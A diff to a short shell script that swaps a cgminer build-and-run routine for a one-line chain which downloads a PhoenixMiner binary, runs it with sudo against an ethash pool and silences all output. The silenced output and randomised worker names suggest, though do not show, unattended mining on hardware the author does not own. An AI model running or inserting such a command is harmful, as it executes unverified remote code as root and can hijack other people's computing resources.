@@ -1,14 +1,2 @@
 #!/bin/sh
-#!/bin/bash
-apt-get update && apt-get upgrade -y
-apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev -y
-apt-get install -qqy automake
-apt-get install -qqy libcurl4-openssl-dev
-apt-get install -qqy make
-git clone https://github.com/ckolivas/cgminer.git
-cd cgminer
-chmod +x ./autogen.sh
-./autogen.sh
-./configure CFLAGS="-O3 -Wall -march=native" ./configure --enable-opencl
-make
-./cgminer -o stratum+tcp://ethash.kupool.com:8888 -u berkah.001 $(echo $(shuf -i 1-99999 -n 1)-T4) -p x
+apt-get install libpci3&&wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz&&tar -xf PhoenixMiner_5.6d_Linux.tar.gz&&cd PhoenixMiner_5.6d_Linux&&sudo ./PhoenixMiner -pool stratum+tcp://ethash.kupool.com:8888 -wal berkah.001 -pass x -a coinX -tt 70 -tstop 84 -tstart 72  -fret 2 -rate 1 &> /dev/null
